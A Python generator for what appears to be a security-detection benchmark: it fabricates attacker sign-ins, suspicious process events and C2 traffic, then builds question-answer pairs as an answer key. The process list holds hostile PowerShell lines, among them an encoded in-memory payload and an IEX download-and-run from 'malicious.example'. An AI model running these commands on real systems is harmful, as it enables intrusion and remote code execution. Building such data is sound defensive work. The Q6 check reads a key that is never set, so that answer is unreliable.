import random
from datetime import datetime, timedelta
import pandas as pd
import polars as pl
from faker import Faker
from tqdm import tqdm

from ..utils import (
    generate_identity_info, 
    generate_aad_sign_in_events, 
    generate_device_info, 
    generate_device_events, 
    generate_device_file_events, 
    generate_device_process_events, 
    generate_email_events, 
    generate_inbound_network_events, 
    generate_outbound_network_events
)

class ValidAccountsAttackGenerator:
    def __init__(self, benign_data, victims, attacker, last_scan_time):
        self.fake = Faker()
        self.benign_data = benign_data
        self.last_scan_time = last_scan_time
        self.victims = victims

        self.data = None
        self.attacker = attacker
        self.attacker_ip = self.fake.ipv4()
        self.compromised_victims = None

    def generate_valid_accounts_attack(self):
        data = {}
        auth_events = []
        signin_events = []
        process_events = []
        network_events = []
        
        num_compromised = max(1, int(len(self.victims) * 0.1))
        self.compromised_victims = self.victims.sample(n=num_compromised)

        initial_compromise_time = self.fake.date_time_between(
            start_date=self.last_scan_time, 
            end_date=datetime.today()
        )
        

        for victim in tqdm(self.compromised_victims.to_dicts(), desc="Generating valid accounts attack events"):

            signin_time = initial_compromise_time + timedelta(minutes=random.randint(0, 120))
            signin_event = generate_aad_sign_in_events(
                identity_row=victim,
                timestamp=signin_time,
                fake=self.fake,
                ip_address=self.attacker_ip
            )
            signin_events.append(signin_event)
            
            # Find user's devices for post-compromise activity
            user_devices = self.benign_data["device_info"].filter(
                pl.col("LoggedOnUsers").str.contains(victim["AccountUpn"])
            )
            
            if user_devices.height > 0:
                device_info = user_devices.sample(n=1).to_dicts()[0]
                
                # Generate suspicious process activity (e.g., PowerShell commands, credential dumping)
                process_time = signin_time + timedelta(minutes=random.randint(5, 30))
                
                # TODO: parametrize the process events to include more file names
                suspicious_commands = [
                    "powershell.exe -NoP -NonI -W Hidden -Enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALAAgAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAIgBIADQAc0kAQQBBAEEAQQBBAEEAQQBBAEEAMABWAFcAeQA2ADcAQwBNAEIAQQBGADkAegBGACsAUQBkAFcAbQBaAFoASQBWAEcAWQAxAGIAQQBSAEgARABRAEsAcwBTAEoAawBYAGEAUQBvAFAAbAB4AGEAWgAyAE8AdgBvAHIAZABsADIANAByAGQAdgAzADQAOQBNADAAZQBBAHYAegB3AC8AaQA5AGwAWgBGAG4AbQBuAGgANgBYAHEAWgBiAFAAYQBQAGIANwBiAG0AUQBGADQAWQBLAEcAaQBBAGUAdQAvAGkAdQBhAFUAbAAzADYAagBOAFkAWgBPAEgAcABrAEQAdgBtAGkAdAArAGcAegB5AGsANABzAFkAYQBLACsAaABjAHAAQwAyAG4AcwB1ADEAWABzAE8AYwB1AGcASQBJAEoASQA3AHIAVQB0AHIAVABMAFEAdAAxACsAZgAyAFQAdgBLAGEAUAAvADAAVgA4AEIAWQBEAE8AVwBMAFQARwBOAFgASwBOAHUAVABzAGUANABoAGQAaQAxAFMAZQB3AEkAUgBCAEwASQBRAFEAUQA2AE8ATgA4AHMAQQBYAEoATQArAGMARABnAFEAaQA5AEoAeQA5AGQARgA2AG4AbwBYADAAMABFAE8AWABnAFkAcgBTAEcAQgBiAHYAUQA1AGEAYgBiAE4AOQBsAFoANABWAEcASgA3AGcAMwBtAGsAbgBSADgAVQB5AHEAeAA1AEwANAAyADQASwBqADcAYQBnAFYAQwBRADEAUgBWAEwAOQBsAHMAdQBvACsATQBkACsAZwBZADYATgBUAGsAZgBMAEEAawAyAHcAYgBmADAAYwBTAGkAUwBpAEYAcABnAFMAZgB5AE8AMABnAGQAMgB4AEYAcgBvAEQATQBpADIATwBMAG4AMgBxADQASABEAEEAaQBEAD0AIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALAAgAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7AA==",
                    "powershell.exe -exec bypass -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/script.ps1')\"",
                    "cmd.exe /c net user administrator /domain",
                    "cmd.exe /c net group \"Domain Admins\" /domain",
                    f"powershell.exe -Command \"Get-WmiObject -Class Win32_UserAccount | Select-Object Name, Domain, SID\"",
                    "powershell.exe -Command \"$env:COMPUTERNAME; whoami; ipconfig /all; net users; net localgroup administrators\""
                ]
                
                for i in range(random.randint(1, 3)):
                    process_command = random.choice(suspicious_commands)
                    process_event = generate_device_process_events(
                        identity_row=victim,
                        device_row=device_info,
                        timestamp=process_time + timedelta(minutes=i*10),
                        fake=self.fake,
                        file_name=process_command.split()[0],
                        process_command_line=process_command
                    )
                    process_events.append(process_event)
                
                c2_domains = [
                    f"{self.fake.word()}-{self.fake.word()}.{random.choice(['com', 'net', 'org'])}",
                    f"{self.fake.word()}.{self.fake.tld()}",
                    f"{self.fake.user_name()}.{random.choice(['com', 'net', 'org'])}"
                ]
                
                c2_domain = random.choice(c2_domains)
                c2_ip = self.fake.ipv4()
                
                for i in range(random.randint(1, 3)):
                    network_time = process_time + timedelta(minutes=random.randint(10, 60))
                    network_event = generate_outbound_network_events(
                        identity_row=victim,
                        device_row=device_info,
                        timestamp=network_time,
                        fake=self.fake,
                        remote_ip=c2_ip,
                        remote_url=c2_domain,
                        remote_port=random.choice([443, 8080, 8443])
                    )
                    network_events.append(network_event)
        
        # Add all generated events to data dictionary
        if signin_events:
            data["aad_sign_in_events_beta"] = pl.DataFrame(signin_events).sort("Timestamp")
        if process_events:
            data["device_process_events"] = pl.DataFrame(process_events).sort("Timestamp")
        if network_events:
            data["device_network_events"] = pl.DataFrame(network_events).sort("Timestamp")
        
        self.data = data
        
        # Find the last event time to return
        all_events = []
        for df in data.values():
            if "Timestamp" in df.columns:
                all_events.extend(df["Timestamp"].to_list())
        
        last_event_time = max(all_events) if all_events else self.last_scan_time
        
        return data, self.compromised_victims, last_event_time

    def generate_question_answer_pairs(self):
        questions = []
        answers = []
        
        # Combine benign and attack events for analysis
        all_signin_events = pl.concat([
            self.benign_data.get("aad_sign_in_events_beta", pl.DataFrame()), 
            self.data.get("aad_sign_in_events_beta", pl.DataFrame())
        ])
        
        all_process_events = pl.concat([
            self.benign_data.get("device_process_events", pl.DataFrame()),
            self.data.get("device_process_events", pl.DataFrame())
        ])
        
        all_network_events = pl.concat([
            self.benign_data.get("device_network_events", pl.DataFrame()),
            self.data.get("device_network_events", pl.DataFrame())
        ])
        
        # Initial detection questions
        Q1 = "Is there evidence of unauthorized access using valid accounts in the environment?"
        Q1_answer = (
            "Yes" if all_signin_events.filter(
                pl.col("IPAddress") == self.attacker_ip
            ).height > 0 else "No"
        )
        questions.append(Q1)
        answers.append(Q1_answer)
        
        # Identify compromised accounts
        Q2 = "Which user accounts show signs of compromise?"
        compromised_upns = (
            all_signin_events
            .filter(pl.col("IPAddress") == self.attacker_ip)
            .select("AccountUpn")
            .unique()
            .to_series()
            .to_list()
        )
        Q2_answer = ", ".join(compromised_upns) if compromised_upns else "None detected"
        questions.append(Q2)
        answers.append(Q2_answer)
        
        # Identify suspicious IP
        Q3 = "What is the suspicious IP address used for authentication?"
        Q3_answer = self.attacker_ip
        questions.append(Q3)
        answers.append(Q3_answer)
        
        # Identify suspicious processes
        Q4 = "What suspicious PowerShell or command-line activities were observed after the compromise?"
        suspicious_commands = []
        if "device_process_events" in self.data:
            suspicious_commands = (
                self.data["device_process_events"]
                .filter(
                    (pl.col("FileName").str.contains("powershell.exe|cmd.exe")) |
                    (pl.col("ProcessCommandLine").str.contains("net user|whoami|IEX|bypass"))
                )
                .select("ProcessCommandLine")
                .to_series()
                .to_list()
            )
        Q4_answer = "\n".join(suspicious_commands) if suspicious_commands else "None detected"
        questions.append(Q4)
        answers.append(Q4_answer)
        
        # Identify affected devices
        Q5 = "Which devices were accessed using the compromised credentials?"
        compromised_devices = []
        if "device_process_events" in self.data:
            compromised_devices = (
                self.data["device_process_events"]
                .select("DeviceName")
                .unique()
                .to_series()
                .to_list()
            )
        Q5_answer = ", ".join(compromised_devices) if compromised_devices else "None detected"
        questions.append(Q5)
        answers.append(Q5_answer)
        
        # Analyze authentication patterns
        Q6 = "Were there authentication attempts outside normal business hours?"
        business_hours_start = 9  # 9 AM
        business_hours_end = 17   # 5 PM
        
        if "aad_sign_in_events" in self.data:
            off_hours_auths = (
                self.data["aad_sign_in_events"]
                .with_columns(
                    pl.col("Timestamp").dt.hour().alias("hour")
                )
                .filter(
                    (pl.col("hour") < business_hours_start) | 
                    (pl.col("hour") > business_hours_end)
                )
            )
            Q6_answer = f"Yes, {off_hours_auths.height} authentication attempts occurred outside business hours" if off_hours_auths.height > 0 else "No"
        else:
            Q6_answer = "Insufficient data to determine"
        questions.append(Q6)
        answers.append(Q6_answer)
        
        # Identify potential lateral movement
        Q7 = "Is there evidence of lateral movement across different systems?"
        if "device_process_events" in self.data and self.data["device_process_events"].height > 0:
            unique_devices = self.data["device_process_events"].select("DeviceName").unique().height
            Q7_answer = f"Yes, activity observed on {unique_devices} different systems" if unique_devices > 1 else "No, activity was limited to a single system"
        else:
            Q7_answer = "No evidence of lateral movement found"
        questions.append(Q7)
        answers.append(Q7_answer)
        
        # Account privileges analysis
        Q10 = "What roles or departments did the compromised users belong to?"
        if self.compromised_victims is not None and self.compromised_victims.height > 0:
            departments = self.compromised_victims.select("Department").unique().to_series().to_list()
            Q10_answer = ", ".join(departments)
        else:
            Q10_answer = "Unable to determine compromised user roles"
        questions.append(Q10)
        answers.append(Q10_answer)
        
        qa_df = pl.DataFrame({"Question": questions, "Answer": answers}, strict=False)
        return qa_df